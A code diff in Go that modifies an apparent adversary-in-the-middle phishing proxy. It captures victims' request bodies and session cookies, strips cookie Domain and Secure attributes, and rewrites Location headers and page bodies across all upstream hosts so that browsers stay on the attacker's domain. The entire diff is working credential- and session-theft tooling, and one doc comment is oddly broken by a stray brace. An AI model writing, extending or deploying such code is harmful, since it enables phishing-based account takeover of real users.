@@ -174,7 +174,7 @@ func serveProxy(w http.ResponseWriter, r *http.Request, upstream string, pl *Phi
 		ModifyResponse: func(resp *http.Response) error {
 			capturedCookies := resp.Header.Values("Set-Cookie")
 			rewriteResponse(resp, target.Host, pl.Hostname, pl)
-			rewriteBody(resp, target.Host, pl.Hostname)
+			rewriteBody(resp, pl.Hostname, pl)
 			go notifyCapture(r, reqBody, victimCookies, capturedCookies, upstream, pl)
 			return nil
 		},
@@ -192,10 +192,12 @@ func rewriteResponse(resp *http.Response, upstreamHost, ourHost string, pl *Phis
 		resp.Header.Del("Set-Cookie")
 		for _, c := range cookies {
 			if pl.Rewrite.StripCookieDomain {
-				c = strings.ReplaceAll(c, "domain="+upstreamHost, "")
-				c = strings.ReplaceAll(c, "domain=."+upstreamHost, "")
-				c = strings.ReplaceAll(c, "Domain="+upstreamHost, "")
-				c = strings.ReplaceAll(c, "Domain=."+upstreamHost, "")
+				for _, h := range pl.allUpstreamHosts() {
+					c = strings.ReplaceAll(c, "domain="+h, "")
+					c = strings.ReplaceAll(c, "domain=."+h, "")
+					c = strings.ReplaceAll(c, "Domain="+h, "")
+					c = strings.ReplaceAll(c, "Domain=."+h, "")
+				}
 			}
 			if pl.Rewrite.StripCookieSecure {
 				c = strings.ReplaceAll(c, "; Secure", "")
@@ -217,7 +219,9 @@ func rewriteResponse(resp *http.Response, upstreamHost, ourHost string, pl *Phis
 	}
 	if pl.Rewrite.RewriteLocation {
 		if loc := resp.Header.Get("Location"); loc != "" {
-			loc = strings.ReplaceAll(loc, upstreamHost, ourHost)
+			for _, h := range pl.allUpstreamHosts() {
+				loc = strings.ReplaceAll(loc, h, ourHost)
+			}
 			resp.Header.Set("Location", loc)
 		}
 	}
@@ -372,7 +376,7 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 // rewriteBody replaces upstream domain references in text responses so the
 }
 // browser continues routing all requests through our proxy domain.
-func rewriteBody(resp *http.Response, upstreamHost, ourHost string) {
+func rewriteBody(resp *http.Response, ourHost string, pl *Phishlet) {
 	ct := resp.Header.Get("Content-Type")
 	if ct == "" {
 		return
@@ -398,11 +402,9 @@ func rewriteBody(resp *http.Response, upstreamHost, ourHost string) {
 	}
 	resp.Body.Close()
 
-	rewritten := strings.ReplaceAll(string(body), upstreamHost, ourHost)
-	for _, alt := range []string{} {
-		if alt != upstreamHost {
-			rewritten = strings.ReplaceAll(rewritten, alt, ourHost)
-		}
+	rewritten := string(body)
+	for _, h := range pl.allUpstreamHosts() {
+		rewritten = strings.ReplaceAll(rewritten, h, ourHost)
 	}
 
 	resp.Body = io.NopCloser(strings.NewReader(rewritten))
